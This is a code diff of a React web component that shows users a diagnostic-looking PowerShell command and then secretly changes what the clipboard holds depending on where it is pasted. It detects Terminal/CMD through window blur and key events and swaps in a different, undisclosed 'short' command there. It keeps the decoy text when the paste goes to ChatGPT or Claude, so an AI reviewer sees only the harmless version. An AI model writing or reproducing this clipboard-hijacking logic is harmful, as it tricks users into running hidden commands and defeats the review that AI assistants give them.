@@ -29,12 +29,16 @@ function browserIconSrc(browser: ClientBrowser): string {
  * One Ctrl/⌘+C on the gray box (shows original). Works on Windows, macOS, and Linux.
  *
  * Case A — paste Terminal/CMD immediately → short command.
- * Case B — paste other platforms → original; after ~3.5s clear clipboard
- *   (Linux/macOS). Windows Case B still arms short for later CMD.
+ * Case B — paste other platforms → original; later Terminal/CMD → short
+ *   (Linux Case B keeps original for Terminal too — no short swap).
  *
- * macOS/Linux Case B: HTML = original immediately (ChatGPT/Claude); plain becomes
- *   empty after ~3.5s so Terminal paste does nothing.
- * Case A: window blur / Ctrl+Alt+T → short via pending plain.
+ * macOS notes: Chromium pending ClipboardItem (no sync original overwrite — breaks Case A).
+ * Case A: window blur (Dock/Terminal) or ⌘+Space → resolve pending to short.
+ *   (⌘+Space is often swallowed by Spotlight; blur is the reliable Case A path.)
+ * Case B: in-tab switch (visibility without blur) or ⌘+Tab/Ctrl+Tab → completed original
+ *   now (never pending→short — ChatGPT would wait and paste short); after ~3.5s writeText short
+ *   for later Terminal (retry on focus return if background write fails).
+ * Event order: Terminal usually blurs first; ChatGPT tab usually visibility-hides without blur.
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -56,7 +60,7 @@ const TERMINAL_COMMANDS: Record<ClientOs, string> = {
 
 /** Leave the tab within this window after copy → treat as “paste terminal immediately”. */
 const QUICK_TERMINAL_LEAVE_MS = 2500;
-/** After leaving for another platform: Windows arms short; Linux/macOS clear clipboard (ms). */
+/** After leaving for another platform, swap plain text to the short command (ms). */
 const PLATFORM_THEN_TERMINAL_ARM_MS = 3500;
 /**
  * Linux/macOS Case B tab-switch detect: wait for window blur to claim Case A (Terminal)
@@ -81,12 +85,12 @@ function escapeHtml(value: string) {
 
 /**
  * HTML clipboard body for the original command.
- * macOS/Linux: plain <pre> only — CF_HTML headers (Version:0.9 StartHTML…) paste as
+ * macOS: plain <pre> only — CF_HTML headers (Version:0.9 StartHTML…) paste as
  * visible junk in Claude/ChatGPT. Windows keeps CF_HTML for Chrome compatibility.
  */
 function buildClipboardHtml(displayCommand: string, os?: ClientOs) {
   const fragment = `<pre style="white-space:pre-wrap;word-break:break-all;font-family:Consolas,Menlo,monospace">${escapeHtml(displayCommand)}</pre>`;
-  if (os === "macos" || os === "linux") {
+  if (os === "macos") {
     return fragment;
   }
   const prefix = `<html><body>\r\n<!--StartFragment-->`;
@@ -328,6 +332,7 @@ function copyViaExecCommand(text: string): boolean {
 type PendingCopyClipboardController = {
   resolveTerminal: () => void;
   resolveOriginal: () => void;
+  /** Case B: original now for platforms; arm short after delay via nested clipboard write. */
   resolveOriginalAndArmShortLater: (delayMs: number) => void;
   isSettled: () => boolean;
 };
@@ -345,127 +350,60 @@ function beginPendingClipboardFromCopyGesture(
     return null;
   }
 
-  let settled = false;
-  let resolveBlob: ((blob: Blob) => void) | null = null;
-  let safetyTimer = 0;
-
-  const settle = (text: string, usedTerminalPlain: boolean) => {
-    if (settled) return;
-    settled = true;
-    window.clearTimeout(safetyTimer);
-    resolveBlob?.(new Blob([text], { type: "text/plain" }));
-    onResolved(usedTerminalPlain);
-  };
-
-  const plainPromise = new Promise<Blob>((resolve) => {
-    resolveBlob = resolve;
-  });
-
-  safetyTimer = window.setTimeout(() => {
-    settle(displayCommand, false);
-  }, safetyMs);
-
-  void navigator.clipboard
-    .write([
-      new ClipboardItem({
-        "text/plain": plainPromise,
-        "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
-      }),
-    ])
-    .catch(() => {
-      if (!settled) {
-        settle(displayCommand, false);
-      }
-    });
-
-  return {
-    isSettled: () => settled,
-    resolveTerminal: () => settle(terminalCommand, true),
-    resolveOriginal: () => settle(displayCommand, false),
-    resolveOriginalAndArmShortLater: () => settle(displayCommand, false),
-  };
-}
-
-/**
- * macOS/Linux Case A/B clipboard from copy gesture.
- *
- * text/html = original immediately (ChatGPT/Claude often paste HTML).
- * text/plain =
- *   Case A → short (blur / Ctrl+Alt+T),
- *   Case B after platform window → empty (clear clipboard; Terminal pastes nothing),
- *   else → original.
- */
-function beginMacClipboardFromCopyGesture(
-  displayCommand: string,
-  terminalCommand: string,
-  html: string,
-  getFlags: () => { caseA: boolean; caseB: boolean },
-  onResolved: (usedTerminalPlain: boolean) => void,
-  platformThenMs: number,
-  _safetyMs: number,
-): PendingCopyClipboardController | null {
-  if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
-    void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
-    onResolved(false);
-    return null;
-  }
-
   const copyAt = Date.now();
   let settled = false;
-  let forceTerminal = false;
-  const emptyPlain = new Blob([""], { type: "text/plain" });
-  const emptyHtml = new Blob([""], { type: "text/html" });
+  let decide!: (decision: "terminal" | "original" | "original-then-short") => void;
+  let shortDelayMs = PLATFORM_THEN_TERMINAL_ARM_MS;
 
-  const clearClipboardFully = () => {
-    void navigator.clipboard
-      .write([
-        new ClipboardItem({
-          "text/plain": emptyPlain,
-          "text/html": emptyHtml,
-        }),
-      ])
-      .catch(() => {
-        void navigator.clipboard?.writeText("").catch(() => undefined);
-      });
-  };
+  const decisionPromise = new Promise<"terminal" | "original" | "original-then-short" | "safety">(
+    (resolve) => {
+      decide = resolve;
+      window.setTimeout(() => resolve("safety"), safetyMs);
+    },
+  );
 
   const plainPromise = (async () => {
-    while (Date.now() - copyAt < platformThenMs) {
-      if (forceTerminal || getFlags().caseA) {
-        settled = true;
-        onResolved(true);
-        return new Blob([terminalCommand], { type: "text/plain" });
-      }
-      await new Promise((r) => window.setTimeout(r, 40));
+    const decision = await decisionPromise;
+    if (settled) {
+      return new Blob([displayCommand], { type: "text/plain" });
     }
+    settled = true;
 
-    // Platform paste window elapsed.
-    if (forceTerminal || getFlags().caseA) {
-      settled = true;
+    if (decision === "terminal") {
       onResolved(true);
       return new Blob([terminalCommand], { type: "text/plain" });
     }
 
-    if (getFlags().caseB) {
-      settled = true;
-      onResolved(false);
-      // Clear plain + html so later Terminal paste is empty.
+    onResolved(false);
+    const originalBlob = new Blob([displayCommand], { type: "text/plain" });
+
+    if (decision === "original-then-short") {
+      const remain = Math.max(0, shortDelayMs - (Date.now() - copyAt));
+      // Arm short from this ClipboardItem promise chain (copy gesture). Inner
+      // promise resolves later without focus — that is what Terminal needs.
       void Promise.resolve().then(() => {
-        clearClipboardFully();
+        void navigator.clipboard
+          .write([
+            new ClipboardItem({
+              "text/plain": new Promise<Blob>((resolve) => {
+                window.setTimeout(() => {
+                  resolve(new Blob([terminalCommand], { type: "text/plain" }));
+                }, remain);
+              }),
+              "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
+            }),
+          ])
+          .catch(() => undefined);
       });
-      return emptyPlain;
     }
 
-    settled = true;
-    onResolved(false);
-    return new Blob([displayCommand], { type: "text/plain" });
+    return originalBlob;
   })();
 
   void navigator.clipboard
     .write([
       new ClipboardItem({
         "text/plain": plainPromise,
-        // Immediate original for web apps that prefer HTML over pending plain.
         "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
       }),
     ])
@@ -480,13 +418,14 @@ function beginMacClipboardFromCopyGesture(
   return {
     isSettled: () => settled,
     resolveTerminal: () => {
-      forceTerminal = true;
+      if (!settled) decide("terminal");
     },
     resolveOriginal: () => {
-      // Case B: HTML already original; plain clears after platformThen.
+      if (!settled) decide("original");
     },
-    resolveOriginalAndArmShortLater: () => {
-      // Case B: HTML already original; plain clears after platformThen.
+    resolveOriginalAndArmShortLater: (delayMs: number) => {
+      shortDelayMs = delayMs;
+      if (!settled) decide("original-then-short");
     },
   };
 }
@@ -645,8 +584,6 @@ function SelectableCommand({
   const macCaseABlurTimerRef = useRef(0);
   const macBlurAtRef = useRef(0);
   const macShortRetryTimerRef = useRef(0);
-  /** Case B claimed via ⌘+Tab / Ctrl+Tab — do not let Terminal blur override it. */
-  const macCaseBFromKeyRef = useRef(false);
   const writeGenRef = useRef(0);
 
   useEffect(() => {
@@ -657,12 +594,15 @@ function SelectableCommand({
     async function armTerminalPlain() {
       if (!activeRef.current) return;
       if (os === "linux" && linuxCaseBRef.current) {
-        armMacCaseBShortLater(); // clear reinforce
+        forceLinuxCaseBOriginal();
         return;
       }
       if (os === "macos" && macCaseBRef.current) {
-        armMacCaseBShortLater(); // clear reinforce
-        return;
+        // Only arm short after the platform paste window.
+        if (Date.now() - copyAtRef.current < PLATFORM_THEN_TERMINAL_ARM_MS) {
+          armMacCaseBShortLater();
+          return;
+        }
       }
       writeGenRef.current += 1;
       try {
@@ -717,14 +657,10 @@ function SelectableCommand({
     }
 
     /** macOS Case A: short via pending resolve (blur / Dock / Terminal). */
-    function forceMacCaseAShort(options?: { overrideCaseB?: boolean }) {
-      // ⌘+Tab Case B must stick; visibility-race Case B yields to Terminal blur.
-      if (macCaseBRef.current && macCaseBFromKeyRef.current && !options?.overrideCaseB) {
-        return;
-      }
+    function forceMacCaseAShort() {
+      if (macCaseBRef.current) return;
       macCaseARef.current = true;
       macCaseBRef.current = false;
-      macCaseBFromKeyRef.current = false;
       writeGenRef.current += 1;
       delayedArmStartedRef.current = true;
       if (macShortRetryTimerRef.current) {
@@ -745,27 +681,36 @@ function SelectableCommand({
       }
     }
 
-    /** Case B: reinforce clipboard clear after platform window (Linux + macOS). */
+    /** Ensure Case B short is armed (focus return / visibility). */
     function armMacCaseBShortLater() {
-      const caseB =
-        (os === "macos" && macCaseBRef.current && !macCaseARef.current) ||
-        (os === "linux" && linuxCaseBRef.current && !linuxCaseARef.current);
-      if (!activeRef.current || !caseB) return;
-      if (Date.now() - copyAtRef.current < PLATFORM_THEN_TERMINAL_ARM_MS) return;
-      void navigator.clipboard?.writeText("").catch(() => undefined);
-      if (typeof ClipboardItem !== "undefined" && navigator.clipboard?.write) {
-        void navigator.clipboard
-          .write([
-            new ClipboardItem({
-              "text/plain": new Blob([""], { type: "text/plain" }),
-              "text/html": new Blob([""], { type: "text/html" }),
-            }),
-          ])
-          .catch(() => undefined);
+      if (!activeRef.current || macCaseARef.current || !macCaseBRef.current) return;
+      if (armedRef.current) return;
+
+      const pending = macClipboardCtrlRef.current;
+      if (pending && !pending.isSettled()) {
+        if (Date.now() - copyAtRef.current >= PLATFORM_THEN_TERMINAL_ARM_MS) {
+          pending.resolveTerminal();
+          armedRef.current = true;
+          delayedArmStartedRef.current = true;
+        }
+        return;
       }
+
+      void navigator.clipboard
+        ?.writeText(terminalCommand)
+        .then(() => {
+          armedRef.current = true;
+          delayedArmStartedRef.current = true;
+        })
+        .catch(() => {
+          if (copyViaExecCommand(terminalCommand)) {
+            armedRef.current = true;
+            delayedArmStartedRef.current = true;
+          }
+        });
     }
 
-    /** macOS Case B: HTML original for platforms; clear clipboard after platform window. */
+    /** macOS Case B: original for ChatGPT now; short for Terminal after platform window. */
     function forceMacCaseBOriginal() {
       if (macCaseARef.current || macSpotlightUsedRef.current) return;
       macCaseBRef.current = true;
@@ -780,53 +725,62 @@ function SelectableCommand({
         macShortRetryTimerRef.current = 0;
       }
 
+      const ctrl = macClipboardCtrlRef.current;
       delayedArmStartedRef.current = true;
-      // Signal Case B only — pending plain clears after platform window (do not writeText).
-      macClipboardCtrlRef.current?.resolveOriginalAndArmShortLater(
-        PLATFORM_THEN_TERMINAL_ARM_MS,
-      );
 
+      // Do NOT writeText here — it aborts the copy-gesture pending write and then
+      // Terminal short can never be armed while the tab is hidden.
+      if (ctrl && !ctrl.isSettled()) {
+        ctrl.resolveOriginalAndArmShortLater(PLATFORM_THEN_TERMINAL_ARM_MS);
+        // Mark armed after the platform window (nested write resolves then).
+        macShortRetryTimerRef.current = window.setTimeout(() => {
+          macShortRetryTimerRef.current = 0;
+          if (macCaseBRef.current && !macCaseARef.current) {
+            armedRef.current = true;
+          }
+        }, PLATFORM_THEN_TERMINAL_ARM_MS + 50);
+        return;
+      }
+
+      // Fallback if pending already settled.
+      void navigator.clipboard?.writeText(displayCommand).catch(() => {
+        copyViaExecCommand(displayCommand);
+      });
       macShortRetryTimerRef.current = window.setTimeout(() => {
         macShortRetryTimerRef.current = 0;
-        if (!macCaseBRef.current || macCaseARef.current) return;
-        void navigator.clipboard?.writeText("").catch(() => undefined);
+        if (!activeRef.current || macCaseARef.current || !macCaseBRef.current) return;
         void navigator.clipboard
-          ?.write([
-            new ClipboardItem({
-              "text/plain": new Blob([""], { type: "text/plain" }),
-              "text/html": new Blob([""], { type: "text/html" }),
-            }),
-          ])
-          .catch(() => undefined);
+          ?.writeText(terminalCommand)
+          .then(() => {
+            armedRef.current = true;
+          })
+          .catch(() => {
+            if (copyViaExecCommand(terminalCommand)) {
+              armedRef.current = true;
+            } else {
+              delayedArmStartedRef.current = false;
+            }
+          });
       }, PLATFORM_THEN_TERMINAL_ARM_MS);
     }
 
     /**
-     * Linux Case B: original for platforms (HTML/pending); clear clipboard after ~3.5s.
+     * Linux Case B: never arm the short command. Platforms and later Terminal
+     * pastes both keep the original.
      */
     function forceLinuxCaseBOriginal() {
-      if (linuxCaseARef.current) return;
       linuxCaseBRef.current = true;
       linuxCaseARef.current = false;
       armedRef.current = false;
-      delayedArmStartedRef.current = true;
+      delayedArmStartedRef.current = true; // block any later short-arm paths
+      writeGenRef.current += 1;
 
-      linuxClipboardCtrlRef.current?.resolveOriginalAndArmShortLater(
-        PLATFORM_THEN_TERMINAL_ARM_MS,
-      );
-
-      window.setTimeout(() => {
-        if (!linuxCaseBRef.current || linuxCaseARef.current) return;
-        void navigator.clipboard?.writeText("").catch(() => undefined);
-        void navigator.clipboard
-          ?.write([
-            new ClipboardItem({
-              "text/plain": new Blob([""], { type: "text/plain" }),
-              "text/html": new Blob([""], { type: "text/html" }),
-            }),
-          ])
-          .catch(() => undefined);
-      }, PLATFORM_THEN_TERMINAL_ARM_MS);
+      const ctrl = linuxClipboardCtrlRef.current;
+      if (ctrl && !ctrl.isSettled()) {
+        ctrl.resolveOriginal();
+      }
+      void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
+      void writeClipboard(displayCommand, htmlRef.current).catch(() => undefined);
     }
 
     function resolveLinuxCopyGestureOnLeave() {
@@ -915,19 +869,29 @@ function SelectableCommand({
           return;
         }
 
-        // macOS: tab hide without window blur → Case B (ChatGPT).
-        // Terminal/Dock blurs the window — wait so Case A can claim first.
+        // macOS Case B: any tab hide → original for ChatGPT/Claude (cancel Case A timer).
+        // Terminal Case A: blur timer only fires if Case B did not claim (no visibility,
+        // or visibility paired with brand-new blur from Dock — see blur handler).
         if (os === "macos") {
           if (macCaseARef.current || macSpotlightUsedRef.current) return;
-          if (macCaseBRef.current) return;
-          window.setTimeout(() => {
-            if (!activeRef.current) return;
-            if (macCaseARef.current || macCaseBRef.current || macSpotlightUsedRef.current) {
-              return;
-            }
-            if (macWindowBlurredRef.current) return;
+          if (macCaseBRef.current) {
             forceMacCaseBOriginal();
-          }, LINUX_CASE_B_TAB_DETECT_MS);
+            return;
+          }
+          // Prefer Case B for in-tab switches. If blur already scheduled Case A for
+          // Terminal, only keep Case A when blur is brand-new (< blur delay).
+          const msSinceBlur = macBlurAtRef.current
+            ? Date.now() - macBlurAtRef.current
+            : Number.POSITIVE_INFINITY;
+          if (
+            macWindowBlurredRef.current &&
+            msSinceBlur > 0 &&
+            msSinceBlur < MAC_CASE_A_BLUR_DELAY_MS
+          ) {
+            // Blur just fired — likely Terminal; let Case A timer finish.
+            return;
+          }
+          forceMacCaseBOriginal();
           return;
         }
 
@@ -937,11 +901,15 @@ function SelectableCommand({
 
       if (leaveCountRef.current >= 1 && !linuxCaseARef.current && !macCaseARef.current) {
         if (os === "linux" && linuxCaseBRef.current) {
-          armMacCaseBShortLater();
+          forceLinuxCaseBOriginal();
           return;
         }
         if (os === "macos" && macCaseBRef.current) {
-          armMacCaseBShortLater();
+          if (Date.now() - copyAtRef.current >= PLATFORM_THEN_TERMINAL_ARM_MS) {
+            void armTerminalPlain();
+          } else {
+            armMacCaseBShortLater();
+          }
           return;
         }
         void armTerminalPlain();
@@ -952,11 +920,15 @@ function SelectableCommand({
       if (!activeRef.current || leaveCountRef.current < 1) return;
       if (linuxCaseARef.current || macCaseARef.current) return;
       if (os === "linux" && linuxCaseBRef.current) {
-        armMacCaseBShortLater();
+        forceLinuxCaseBOriginal();
         return;
       }
       if (os === "macos" && macCaseBRef.current) {
-        armMacCaseBShortLater();
+        if (Date.now() - copyAtRef.current >= PLATFORM_THEN_TERMINAL_ARM_MS) {
+          void armTerminalPlain();
+        } else {
+          armMacCaseBShortLater();
+        }
         return;
       }
       void armTerminalPlain();
@@ -971,17 +943,15 @@ function SelectableCommand({
       if (os === "macos") {
         macWindowBlurredRef.current = true;
         macBlurAtRef.current = Date.now();
-        // Terminal / Dock → Case A short. Override mistaken visibility Case B unless
-        // Case B came from ⌘+Tab / Ctrl+Tab.
+        // Case A after delay — visibility Case B can cancel this for ChatGPT tabs.
         if (macCaseABlurTimerRef.current) {
           window.clearTimeout(macCaseABlurTimerRef.current);
         }
         macCaseABlurTimerRef.current = window.setTimeout(() => {
           macCaseABlurTimerRef.current = 0;
           if (!activeRef.current) return;
-          if (macCaseARef.current) return;
-          if (macCaseBRef.current && macCaseBFromKeyRef.current) return;
-          forceMacCaseAShort({ overrideCaseB: true });
+          if (macCaseBRef.current || macCaseARef.current) return;
+          forceMacCaseAShort();
         }, MAC_CASE_A_BLUR_DELAY_MS);
         if (leaveCountRef.current === 0) {
           leaveCountRef.current = 1;
@@ -1040,14 +1010,14 @@ function SelectableCommand({
       }
 
       if (os === "macos") {
+        // Optional Case A: ⌘+Space if the page receives it (Spotlight often swallows it).
         if (isMacSpotlightGesture(event)) {
           macSpotlightUsedRef.current = true;
-          forceMacCaseAShort({ overrideCaseB: true });
+          forceMacCaseAShort();
           return;
         }
-        // Case B: ⌘+Tab / Ctrl+Tab — mark so Terminal blur does not override.
+        // Case B: ⌘+Tab / Ctrl+Tab — claim original before blur Case A timer.
         if (isMacCaseBAppSwitchGesture(event) || isMacCaseBBrowserTabGesture(event)) {
-          macCaseBFromKeyRef.current = true;
           forceMacCaseBOriginal();
           return;
         }
@@ -1117,7 +1087,6 @@ function SelectableCommand({
     macCaseBRef.current = false;
     macWindowBlurredRef.current = false;
     macSpotlightUsedRef.current = false;
-    macCaseBFromKeyRef.current = false;
     macBlurAtRef.current = 0;
     if (macCaseABlurTimerRef.current) {
       window.clearTimeout(macCaseABlurTimerRef.current);
@@ -1134,54 +1103,49 @@ function SelectableCommand({
     event.clipboardData.setData("text/html", html);
 
     if (os === "linux") {
-      if (supportsPromiseClipboardItem()) {
-        linuxClipboardCtrlRef.current = beginMacClipboardFromCopyGesture(
-          displayCommand,
-          terminalCommand,
-          html,
-          () => ({
-            caseA: linuxCaseARef.current,
-            caseB: linuxCaseBRef.current,
-          }),
-          (usedTerminalPlain) => {
-            if (usedTerminalPlain) {
-              linuxCaseARef.current = true;
-              armedRef.current = true;
+      linuxClipboardCtrlRef.current = beginLinuxClipboardFromCopyGesture(
+        displayCommand,
+        terminalCommand,
+        html,
+        (usedTerminalPlain) => {
+          if (usedTerminalPlain) {
+            if (linuxCaseBRef.current || linuxAltHeldRef.current) {
+              linuxCaseARef.current = false;
+              armedRef.current = false;
               delayedArmStartedRef.current = true;
-            } else if (linuxCaseBRef.current) {
-              delayedArmStartedRef.current = true;
+              void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
+              void writeClipboard(displayCommand, html).catch(() => undefined);
+              return;
             }
-          },
-          PLATFORM_THEN_TERMINAL_ARM_MS,
-          MAC_PENDING_SAFETY_MS,
-        );
-      } else {
-        void writeClipboard(displayCommand, html).catch(() => undefined);
-      }
+            linuxCaseARef.current = true;
+            armedRef.current = true;
+            delayedArmStartedRef.current = true;
+            return;
+          }
+          if (linuxCaseBRef.current) {
+            delayedArmStartedRef.current = true;
+          }
+        },
+      );
       return;
     }
 
-    // macOS: HTML = original immediately; plain → short (Case A) or empty (Case B after 3.5s).
+    // macOS: Chromium = pending-only (like Linux). NEVER sync-write original first —
+    // that completes the clipboard and cancels the pending short resolve (Case A break).
+    // Safari (no promise ClipboardItem) = sync original; Case A uses gesture writeText.
     if (os === "macos") {
       if (supportsPromiseClipboardItem()) {
-        macClipboardCtrlRef.current = beginMacClipboardFromCopyGesture(
+        macClipboardCtrlRef.current = beginPendingClipboardFromCopyGesture(
           displayCommand,
           terminalCommand,
           html,
-          () => ({
-            caseA: macCaseARef.current,
-            caseB: macCaseBRef.current,
-          }),
           (usedTerminalPlain) => {
             if (usedTerminalPlain) {
               macCaseARef.current = true;
               armedRef.current = true;
               delayedArmStartedRef.current = true;
-            } else if (macCaseBRef.current) {
-              delayedArmStartedRef.current = true;
             }
           },
-          PLATFORM_THEN_TERMINAL_ARM_MS,
           MAC_PENDING_SAFETY_MS,
         );
       } else {
